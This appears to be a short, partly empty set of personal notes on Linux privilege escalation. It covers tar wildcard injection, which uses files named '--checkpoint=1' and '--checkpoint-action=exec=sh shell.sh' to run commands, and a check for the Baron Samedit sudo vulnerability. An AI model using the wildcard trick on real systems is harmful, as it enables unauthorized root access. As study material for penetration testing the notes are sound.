- [[#Insecure File Permissions|Insecure File Permissions]]
- [[#Insecure System Components|Insecure System Components]]
- [[#Wildcards|Wildcards]]
	- [[#Wildcards#Tar|Tar]]
- [[#CVE|CVE]]
	- [[#CVE#BaronSamEdit|BaronSamEdit]]
		- [[#BaronSamEdit#How can I test if I have vulnerable version?|How can I test if I have vulnerable version?]]

## Enummeration

## Insecure File Permissions

## Insecure System Components

## Wildcards

### Tar

```bash
cd /opt/admin && tar -zxvf /tmp/backup.tar.gz *

/usr/bin/tar -xf * -C /opt/temp
```

Move to `/opt/admin`
Create files:

```
--checkpoint=1
```
```
--checkpoint-action=exec=sh shell.sh
```
```
shell.sh
```
Include execution desired in shell.sh
##  CVE

### BaronSamEdit

Vulnerabilidad en Sudo para Unix
Ubuntu Sudo 1.8.31

#### How can I test if I have vulnerable version?

To test if a system is vulnerable or not, login to the system as a non-root user.

Run command “sudoedit -s /”

If the system is vulnerable, it will respond with an error that starts with “sudoedit:”

If the system is patched, it will respond with an error that starts with “usage:”

https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
